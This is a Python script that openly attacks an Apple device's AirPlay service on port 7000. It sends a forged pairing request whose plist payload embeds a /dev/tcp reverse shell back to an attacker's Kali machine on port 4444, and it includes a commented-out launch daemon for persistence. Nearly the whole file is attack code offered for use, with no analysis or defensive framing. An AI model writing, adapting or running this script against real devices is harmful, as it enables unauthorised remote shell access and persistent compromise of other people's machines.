import socket
import time

# === CONFIG ===
target_ip = "192.168.1.42"      # ← replace with your Apple device IP
target_port = 7000
attacker_ip = "192.168.1.100"   # ← replace with your Kali IP
attacker_port = 4444

# === Fake Plist Payload with reverse shell simulation ===
# Option A: One-time reverse shell (default)
reverse_shell_cmd = f"/bin/sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"

# Option B: Persistent launch daemon (commented out, activate if needed)
# This would simulate dropping a malicious launch agent if allowed
# launchctl_payload = f'''
# <dict>
#   <key>Label</key><string>com.eva.rev</string>
#   <key>ProgramArguments</key>
#   <array>
#     <string>/bin/sh</string>
#     <string>-c</string>
#     <string>{reverse_shell_cmd}</string>
#   </array>
#   <key>RunAtLoad</key><true/>
# </dict>
# '''

# === Full plist payload wrapped in POST ===
xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>launchctl</key>
    <string>{reverse_shell_cmd}</string>
</dict>
</plist>
"""

# === Construct HTTP POST request ===
http_request = (
    f"POST /pairing-init HTTP/1.1\r\n"
    f"Host: {target_ip}\r\n"
    f"Content-Type: application/x-apple-binary-plist\r\n"
    f"Content-Length: {len(xml_payload)}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
    f"{xml_payload}"
).encode()

# === TCP Send ===
print(f"[*] Connecting to {target_ip}:{target_port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)

try:
    s.connect((target_ip, target_port))
    print("[*] Sending forged AirPlay pairing request with embedded shell command...")
    s.send(http_request)

    response = s.recv(4096)
    print("[*] Received response:")
    print(response.decode(errors="ignore"))

except socket.timeout:
    print("[!] No response — possible crash or hang")
except Exception as e:
    print(f"[!] Connection error: {e}")
finally:
    s.close()
